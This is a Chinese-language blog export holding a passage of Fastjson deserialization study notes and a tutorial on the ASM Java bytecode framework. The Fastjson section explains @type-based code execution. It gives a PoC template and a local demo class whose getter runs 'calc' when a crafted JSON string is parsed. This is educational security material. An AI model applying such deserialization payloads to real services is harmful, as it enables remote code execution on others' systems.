<li>如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</li>
</ul>
<p>看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。</p>
<p>但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。</p>
<p>对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。</p>
<h1 id="Fastjson反序列化漏洞原理"><a href="#Fastjson反序列化漏洞原理" class="headerlink" title="Fastjson反序列化漏洞原理"></a>Fastjson反序列化漏洞原理</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p>
<p>通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p>
<p><strong>那么如何才能够反序列化出恶意类呢？</strong></p>
<p>由前面demo知道，Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p>
<p><strong>接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？</strong></p>
<p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。</p>
<p>到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"unchecked"</span>, <span class="string">"rawtypes"</span> &#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEY即@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">		...</span><br><span class="line">        ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p><strong>小结一下</strong></p>
<p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p>
<p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p>
<h2 id="PoC写法"><a href="#PoC写法" class="headerlink" title="PoC写法"></a>PoC写法</h2><p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"@type"</span>:<span class="string">"xxx.xxx.xxx"</span>,</span><br><span class="line"><span class="string">"xxx"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p>
<ol>
<li>该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；</li>
<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
</ol>
<h2 id="漏洞demo"><a href="#漏洞demo" class="headerlink" title="漏洞demo"></a>漏洞demo</h2><p>由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StudentDemo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>触发代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jsonstring =<span class="string">"&#123;\"@type\":\"fastjson2change.StudentDemo\",\"age\":18,\"name\":\"0range\",\"address\":\"China\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring, Object<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>结果成功触发：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624163813380.png" alt="image-20200624163813380"></p>
<p>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p>
<p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StudentDemo obj = JSON.parseObject(jsonstring, StudentDemo<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>触发场景；</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624164056028.png" alt="image-20200624164056028"></p>
<p>这一篇先写到这里，下一篇讲讲Fastjson的漏洞时间线。</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>ASM笔记</title>
    <url>/ASM%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>累土而不辍，丘山崇成。</p>
</blockquote>
<p>今天来学习磨人的ASM框架。</p>
<a id="more"></a>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 是一个 Java 字节码操控框架。它能被用来动态生成类或者增强既有类的功能。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。Java class 被存储在严格格式定义的 .class 文件里，这些类文件拥有足够的元数据来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。ASM 从类文件中读入信息后，能够<u>改变</u>类行为，<u>分析</u>类信息，甚至能够根据用户要求生成新类。</p>
<p>简单的说，ASM可以读取解析<code>class</code>文件内容，并提供接口让你可以对<code>class</code>文件字节码内容进行CRUD操作。</p>
<p><strong>注:</strong> <code>class</code>文件存储的是<code>java</code>字节码，ASM 是对<code>java</code>字节码操作的一层封装，因此，如果你很了解 <code>class</code>文件格式的话，你甚至可以通过直接使用文本编辑器（eg:Vim）来改写<code>class</code>文件。</p>
<p>知道了 ASM 的作用后，接下来就来看下 ASM 的执行模式。</p>
<h1 id="ASM框架执行流程"><a href="#ASM框架执行流程" class="headerlink" title="ASM框架执行流程"></a>ASM框架执行流程</h1><p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 提供了两组API：Core和Tree：</p>
<ul>
<li>Core是基于访问者模式来操作类的</li>
<li>Tree是基于树节点来操作类的</li>
</ul>
<p><strong>本文我们主要讨论的是 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 的 CoreAPI。</strong></p>
<p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 内部采用 <strong>访问者模式</strong> 将 <code>.class</code> 类文件的内容从头到尾扫描一遍，每次扫描到类文件相应的内容时，都会调用<code>ClassVisitor</code>内部相应的方法。<br> 比如：</p>
<ul>
<li>扫描到<strong>类文件</strong>时，会回调<code>ClassVisitor</code>的<code>visit()</code>方法；</li>
<li>扫描到<strong>类注解</strong>时，会回调<code>ClassVisitor</code>的<code>visitAnnotation()</code>方法；</li>
<li>扫描到<strong>类成员</strong>时，会回调<code>ClassVisitor</code>的<code>visitField()</code>方法；</li>
<li>扫描到<strong>类方法</strong>时，会回调<code>ClassVisitor</code>的<code>visitMethod()</code>方法；<br> ······<br> 扫描到相应结构内容时，会回调相应方法，该方法会返回一个对应的字节码操作对象（比如，<code>visitMethod()</code>返回<code>MethodVisitor</code>实例），通过修改这个对象，就可以修改<code>class</code>文件相应结构部分内容，最后将这个<code>ClassVisitor</code>字节码内容覆盖原来<code>.class</code>文件就实现了类文件的代码切入。</li>
</ul>
<p>具体关系如下：</p>
<table>
<thead>
<tr>
<th align="center">树形关系</th>
<th align="center">使用的接口</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Class</td>
<td align="center">ClassVisitor</td>
</tr>
<tr>
<td align="center">Field</td>
<td align="center">FieldVisitor</td>
</tr>
<tr>
<td align="center">Method</td>
<td align="center">MethodVisitor</td>
</tr>
<tr>
<td align="center">Annotation</td>
<td align="center">AnnotationVisitor</td>
</tr>
</tbody></table>
<p>整个具体的执行时序如下图所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509145250530.png" alt="image-20200509145250530"></p>
<p>通过时序图可以看出<a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a>在处理<code>class</code>文件的整个过程。<a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a>通过树这种数据结构来表示复杂的字节码结构，并利用 <strong>Push模型</strong> 来对树进行遍历。</p>
<ul>
<li><p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 中提供一个<code>ClassReader</code>类，这个类可以直接由字节数组或者<code>class</code>文件间接的获得字节码数据。它会调用<code>accept()</code>方法，接受一个实现了抽象类<code>ClassVisitor</code>的对象实例作为参数，然后依次调用<code>ClassVisitor</code>的各个方法。字节码空间上的偏移被转成各种<code>visitXXX</code>方法。使用者只需要在对应的的方法上进行需求操作即可，无需考虑字节偏移。</p>
</li>
<li><p>这个过程中<code>ClassReader</code>可以看作是一个事件生产者，<code>ClassWriter</code>继承自<code>ClassVisitor</code>抽象类，负责将对象化的class文件内容重构成一个二进制格式的<code>class</code>字节码文件，<code>ClassWriter</code>可以看作是一个事件的消费者。</p>
</li>
<li><p>通常，<code>cr.accept(cvv, skip_Debug)</code>.</p>
<p>cvv通常是来继承<code>ClassVistor</code>的一个类的实例，这个类里面通常重载<code>ClassVisitor</code>的一系列方法，实现我们自己的操作。</p>
</li>
</ul>
<p>接下来还剩的一点内容就是如何实现<code>class</code>文件字节码的修改。</p>
<h1 id="ASM字节码修改"><a href="#ASM字节码修改" class="headerlink" title="ASM字节码修改"></a>ASM字节码修改</h1><p>由于 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 是直接对<code>class</code>文件的字节码进行操作，因此，要修改<code>class</code>文件内容时，也要注入相应的<code>java</code>字节码。</p>
<p>所以，在注入字节码之前，我们还需要了解下<code>class</code>文件的结构，JVM指令等知识。</p>
<h2 id="Class文件结构"><a href="#Class文件结构" class="headerlink" title="Class文件结构"></a>Class文件结构</h2><p> <code>Java</code>源文件经过<code>javac</code>编译器编译之后，将会生成对应的二进制<code>.class</code>文件，如下图所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509153518513.png" alt="image-20200509153518513"></p>
<p><code>Java</code>类文件是 8 位字节的二进制流。数据项按顺序存储在<code>class</code>文件中，相邻的项之间没有间隔，这使得<code>class</code>文件变得紧凑，减少存储空间。在<code>Java</code>类文件中包含了许多大小不同的项，由于每一项的结构都有严格规定，这使得 class 文件能够从头到尾被顺利地解析。</p>
<p>每个<code>class</code>文件都是有固定的结构信息，而且保留了源码文件中的符号。下图是<code>class</code>文件的格式图。其中带 * 号的表示可重复的结构。</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509153606292.png" alt="image-20200509153606292"></p>
<p>类结构体中所有的修饰符、字符常量和其他常量都被存储在class文件开始的一个常量堆栈(Constant Stack)中，其他结构体通过索引引用。</p>
<p>每个类必须包含headers（包括：class name, super class, interface, etc.）和常量堆栈（Constant Stack）其他元素，例如：字段（fields）、方法（methods）和全部属性（attributes）可以选择显示或者不显示。</p>
<p>每个字段块（Field section）包括名称、修饰符（public, private, etc.）、描述符号(descriptor)和字段属性。</p>
<p>每个方法区域（Method section）里面的信息与header部分的信息类似，信息关于最大堆栈（max stack）和最大本地变量数量（max local variable numbers）被用于修改字节码。对于非abstract和非native的方法有一个方法指令表，exceptions表和代码属性表。除此之外，还可以有其他方法属性。</p>
<p>每个类、字段、方法和方法代码的属性有属于自己的名称记录在类文件格式的JVM规范的部分，这些属性展示了字节码多方面的信息，例如源文件名、内部类、签名、代码行数、本地变量表和注释。JVM规范允许定义自定义属性，这些属性会被标准的VM（虚拟机）忽略，但是可以包含附件信息。</p>
<p>方法代码表包含一系列对java虚拟机的指令。有些指令在代码中使用偏移量，当指令从方法代码被插入或者移除时，全部偏移量的值可能需要调整。</p>
<h2 id="Java类型与Class文件内部类型对应关系"><a href="#Java类型与Class文件内部类型对应关系" class="headerlink" title="Java类型与Class文件内部类型对应关系"></a>Java类型与Class文件内部类型对应关系</h2><p><code>Java</code>类型分为基本类型和引用类型，在 JVM 中对每一种类型都有与之相对应的类型描述，如下表：</p>
<table>
<thead>
<tr>
<th align="center">Java type</th>
<th align="center">JVM Type descriptor</th>
</tr>
</thead>
<tbody><tr>
<td align="center">boolean</td>
<td align="center">Z</td>
</tr>
<tr>
<td align="center">char</td>
<td align="center">C</td>
</tr>
<tr>
<td align="center">byte</td>
<td align="center">B</td>
</tr>
<tr>
<td align="center">short</td>
<td align="center">S</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">I</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">J</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">D</td>
</tr>
<tr>
<td align="center">Object</td>
<td align="center">Ljava/lang/Object;</td>
</tr>
<tr>
<td align="center">int[]</td>
<td align="center">[I</td>
</tr>
<tr>
<td align="center">Object[][]</td>
<td align="center">[[Ljava/lang/Object;</td>
</tr>
</tbody></table>
<p>在 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 中要获得一个类的 JVM 内部描述，可以使用<code>org.objectweb.asm.Type</code>类中的<code>getDescriptor(final Class c)</code>方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeDescriptors</span> </span>&#123;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;    </span><br><span class="line">   System.out.println(Type.getDescriptor(TypeDescriptors<span class="class">.<span class="keyword">class</span>))</span>;    </span><br><span class="line">     System.out.println(Type.getDescriptor(String<span class="class">.<span class="keyword">class</span>))</span>;    </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lorg/victorzhzh/core/structure/TypeDescriptors;    </span><br><span class="line">Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<h2 id="Java方法声明与Class内部声明的对应关系"><a href="#Java方法声明与Class内部声明的对应关系" class="headerlink" title="Java方法声明与Class内部声明的对应关系"></a>Java方法声明与Class内部声明的对应关系</h2><p>在·Java·的二进制文件中，方法的方法名和方法的描述都是存储在Constant pool 中的，且在两个不同的单元里。因此，方法描述中不含有方法名，只含有参数类型和返回类型。</p>
<p>格式：(参数描述符)返回值描述符</p>
<table>
<thead>
<tr>
<th align="center">Method declaration in source file</th>
<th align="center">Method descriptor</th>
</tr>
</thead>
<tbody><tr>
<td align="center">void m(int i, float f)</td>
<td align="center">(IF)V</td>
</tr>
<tr>
<td align="center">int m(Object o)</td>
<td align="center">(Ljava/lang/Object;)I</td>
</tr>
<tr>
<td align="center">int[] m(int i, String s)</td>
<td align="center">(ILjava/lang/String;)[I</td>
</tr>
<tr>
<td align="center">Object m(int[] i)</td>
<td align="center">([I]Ljava/lang/Object;</td>
</tr>
<tr>
<td align="center">String m()</td>
<td align="center">()Ljava/lang/String;</td>
</tr>
</tbody></table>
<h2 id="JVM指令"><a href="#JVM指令" class="headerlink" title="JVM指令"></a>JVM指令</h2><p>假设现在我们有如下一个类：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509154551909.png" alt="image-20200509154551909"></p>
<p>先用<code>javac com/yn/test/Test.java</code>编译得到<code>Test.class</code>文件，然后再使用<code>javap -c com/yn/test/Test</code>来查看下这个<code>Test.class</code>文件的字节码，结果如下图所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509154617771.png" alt="image-20200509154617771"></p>
<p>上图中第3行到第7行，是类<code>Test</code>的默认构造函数（由编译器默认生成），<code>Code</code>以下部分是构造函数内部代码，其中：</p>
<p><strong>aload_0</strong>：  这个指令是LOAD系列指令中的一个，它的意思表示装载当前第 0 个元素到堆栈中。代码上相当于<strong>this</strong>。而这个数据元素的类型是一个引用类型。这些指令包含了：ALOAD，ILOAD，LLOAD，FLOAD，DLOAD。区分它们的作用就是针对不用数据类型而准备的LOAD指令，此外还有专门负责处理数组的指令 SALOAD。</p>
<p><strong>invokespecial</strong>： 这个指令是调用系列指令中的一个。其目的是调用对象类的方法。后面需要给上父类的方法完整签名。“#1”的意思是 .class 文件常量表中第1个元素。值为：“java/lang/Object.”<init>“:()V”。结合ALOAD_0。这两个指令可以翻译为：“super()”。其含义是调用自己的父类构造方法。</init></p>
<p>第9到14行是<code>main</code>方法，<code>Code</code>以下是其字节码表示：</p>
<p><strong>getstatic</strong>：   这个指令是GET系列指令中的一个其作用是获取静态字段内容到堆栈中。这一系列指令包括了：GETFIELD、GETSTATIC。它们分别用于获取动态字段和静态字段。此处表示的意思获取静态成员<code>System.out</code>到堆栈中。</p>
<p><strong>ldc</strong>：这个指令的功能是从常量表中装载一个数据到堆栈中。此处表示从常量池中获取字符串”Hello World!”。</p>
<p><strong>invokevirtual</strong>：也是一种调用指令，这个指令区别与 invokespecial 的是它是根据引用调用对象类的方法。此处表示调用<code>java.io.PrintStream.println(String)</code>方法，结合前面的操作，这里调用的就是<code>System.out.println(&quot;Hello World!&quot;)</code>。</p>
<p><strong>return</strong>： 这也是一系列指令中的一个，其目的是方法调用完毕返回：可用的其他指令有：IRETURN，DRETURN，ARETURN等，用于表示不同类型参数的返回。</p>
<p>接下来，我们就可以根据上面所讲的内容，将代码字节码注入到<code>class</code>文件中了。</p>
<p>现在假设我们想要在类<code>Test</code>的<code>main</code>方法前后动态插入代码，如下所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509154949319.png" alt="image-20200509154949319"></p>
<p>要完成在<code>main</code>方法前后插入输出代码，需要以下几步操作：</p>
<p><strong>读取<code>Test.class</code>文件，可以通过 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 提供的<code>ClassReader</code>类进行<code>class</code>文件的读取与遍历。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用全限定名，创建一个ClassReader对象</span></span><br><span class="line">ClassReader classReader = <span class="keyword">new</span> ClassReader(<span class="string">"com.yn.test.Test"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建一个ClassWriter对象，并设置让系统自动计算栈和本地变量大小</span></span><br><span class="line">ClassWriter classWriter = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_MAXS);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自定义ClassVisitor，方便后续ClassReader的遍历通知</span></span><br><span class="line">ClassVisitor classVisitor = <span class="keyword">new</span> TestClassVisitor(classWriter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始扫描class文件</span></span><br><span class="line">classReader.accept(classVisitor, ClassReader.SKIP_DEBUG);</span><br></pre></td></tr></table></figure>

<p>从<code>javap</code>反编译得到的字节码可以知道，实现<code>System.out.println(&quot;Hello World!&quot;);</code>的字节码总共需要3步操作：<br> (1). 获取<code>System</code>静态成员<code>out</code>，其对应的指令为<code>getstatic</code>，对应的 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mv.visitFieldInsn(Opcodes.GETSTATIC,</span><br><span class="line">                  Type.getInternalName(System.class), //"java/lang/System"</span><br><span class="line">                  <span class="string">"out"</span>,</span><br><span class="line">                  Type.getDescriptor(PrintStream.class) //"Ljava/io/PrintStream;"</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>

<p> (2). 获取字符串常量”Hello World!”，其对应的指令为<code>ldc</code>，对应的 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mv.visitLdcInsn(<span class="string">"Hello World!"</span>);</span><br></pre></td></tr></table></figure>

<p>(3). 获取<code>PrintStream.println(String)</code>方法，其对应的指令为<code>invokervirtual</code>，对应的 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL,</span><br><span class="line">                   Type.getInternalName(PrintStream.class), //"java/io/PrintStream"</span><br><span class="line">                   <span class="string">"println"</span>,</span><br><span class="line">                   <span class="string">"(Ljava/lang/String;)V"</span>,<span class="comment">//方法描述符</span></span><br><span class="line">                   <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<p><strong>在<code>main</code>方法进入前，进行代码插入，可以通过<code>MethodVisitor.visitCode()</code>方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在源方法前去修改方法内容,这部分的修改将加载源方法的字节码之前</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      mv.visitCode();</span><br><span class="line">      System.out.println(<span class="string">"method start to insert code"</span>);</span><br><span class="line">      sop(<span class="string">"asm insert before"</span>);<span class="comment">//this is the insert code</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>在<code>main</code>方法退出前，进行代码插入，可以通关过<code>MethodVisitor.visitInsn()</code>方法，通过判断当前的指令为<code>return</code>时，表明即将执行<code>return</code>语句，此时插入字节码即可。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//检测到return语句</span></span><br><span class="line">    <span class="keyword">if</span> (opcode == Opcodes.RETURN) &#123;</span><br><span class="line">        System.out.println(<span class="string">"method end to insert code"</span>);</span><br><span class="line">        sop(<span class="string">"asm insert after"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//执行原本语句</span></span><br><span class="line">        mv.visitInsn(opcode);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>字节码插入<code>class</code>文件成功后，导出字节码到原文件中。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取改写后的class二进制字节码</span></span><br><span class="line"><span class="keyword">byte</span>[] classFile = classWriter.toByteArray();</span><br><span class="line"><span class="comment">// 将这个类输出到原先的类文件目录下，这是原先的类文件已经被修改</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"E:/code/Android/Projects/AsmButterknife/sample-java/build/classes/java/main/com/yn/test/Test.class"</span>);</span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">fos.write(classFile);</span><br><span class="line">fos.close();</span><br></pre></td></tr></table></figure>

<p><strong>注:</strong> <a href="http://search.maven.org/#search|ga|1|a%3A" target="_blank" rel="noopener" asm-commons"">asm-commons</a> 包中提供了一个类<code>AdviceAdapter</code>，使用该类可以更加方便的让我们在方法前后注入代码，因为其提供了方法<code>onMethodEnter()</code>和<code>onMethodExit()</code>。</p>
<p>通过上面介绍的内容，我们已经成功使用 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 动态注入字节码到<code>class</code>文件中。但是如果直接采用 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码注入字节码，还是相对困难的，幸运的是 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 给我们提供了 <a href="http://asm.ow2.org/doc/faq.html#Q10" target="_blank" rel="noopener">ASMifier</a> 工具，使得我们可以直接通过<code>.class</code>文件反编译为 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 代码。</p>
<p><a href="https://github.com/Why8n/AsmButterknife/blob/master/sample-java/src/main/java/com/yn/test/AsmTest.java" target="_blank" rel="noopener">完整代码</a></p>
<h1 id="ASM关键接口"><a href="#ASM关键接口" class="headerlink" title="ASM关键接口"></a>ASM关键接口</h1><h2 id="ClassVisitor"><a href="#ClassVisitor" class="headerlink" title="ClassVisitor"></a>ClassVisitor</h2><p>ClassVisitor，在 ASM3.0 中是一个接口，到了 ASM4.0 与 ClassAdapter 抽象类合并。主要负责 “拜访” 类成员信息。其中包括（标记在类上的注解，类的构造方法，类的字段，类的方法，静态代码块）,它的完整接口如下：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509160013663.png" alt="image-20200509160013663"></p>
<h3 id="visit-int-int-String-String-String-String"><a href="#visit-int-int-String-String-String-String" class="headerlink" title="visit(int , int , String , String , String , String[])"></a>visit(int , int , String , String , String , String[])</h3><p>该方法是当扫描类时第一个拜访的方法，主要用于类声明使用。下面是对方法中各个参数的示意：<strong>visit( 类版本 ,</strong> <strong>修饰符</strong> <strong>, 类名 , 泛型信息 , 继承的父类 , 实现的接口**</strong>)。例如：</p>
